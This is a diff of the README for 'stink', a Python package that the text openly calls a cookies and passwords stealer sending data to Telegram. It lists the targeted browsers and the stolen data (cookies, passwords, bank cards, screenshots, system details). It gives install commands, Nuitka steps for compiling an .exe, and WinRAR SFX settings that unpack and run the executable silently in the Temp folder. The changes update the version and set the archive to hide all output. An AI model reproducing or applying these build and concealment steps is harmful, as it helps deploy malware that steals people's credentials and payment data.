@@ -36,13 +36,13 @@ Cookies and passwords stealer in just 2 lines. Sending to Telegram.
    - Microsoft Edge
    - Brave
 2. Collecting the following data:
-   - Screenshot.
-   - Cookies.
-   - Passwords.
-   - Bank cards.
-   - IP-address.
-   - System configuration.
-   - Active processes.
+   - Screenshot
+   - Cookies
+   - Passwords
+   - Bank cards
+   - IP-address
+   - System configuration
+   - Active processes
 3. Sending an archive of collected data to Telegram.
 4. Execution in a separate thread.
 
@@ -54,7 +54,7 @@ Cookies and passwords stealer in just 2 lines. Sending to Telegram.
 
 You can install the latest version with the command:
 ```
-pip install stink==1.0.1
+pip install stink==1.0.2
 ```
 
 ## Example usage
@@ -156,7 +156,7 @@ venv\Scripts\activate
 pip install Nuitka==0.6.16.4
 ```
 ```
-pip install stink==1.0.1
+pip install stink==1.0.2
 ```
 6. Write the command:
 ```
@@ -178,14 +178,14 @@ File `.exe` is too big, so we will compress it with WinRAR, but it will still be
 3. Select the `RAR` archive format, `Maximum` compression method, and `32 MB` Dictionary size and click `Create SFX archive`.
 4. Go to the tab `Advanced` and select `SFX options`.
 5. Go to the tab `Install` and enter the name of your file (for example `test.exe`) into the field `Execute after unpacking`.
-6. Go to the tab `Modes` and click `Unpack to Timas folder` and select `Dump everything` in the section `Information output mode`.
+6. Go to the tab `Modes` and click `Unpack to Temp folder` and select `Hide all` in the section `Information output mode`.
 7. Go to the tab `Update` and select `Overwrite all files without request` in the section `Overwrite mode`.
 8. Change the icon and logo if you want in the tab `Text and Graphics`.
 9. Press `OK`.
 
 As a result we get `.exe` file reduced several times:
 ```
-        File size              Ratio
-------------------------    -----------
-48 091 KB  ->  15 239 KB       68.3%
+        File size           Ratio
+------------------------    -----
+41 748 KB  ->  13 664 KB    67.2%
 ```
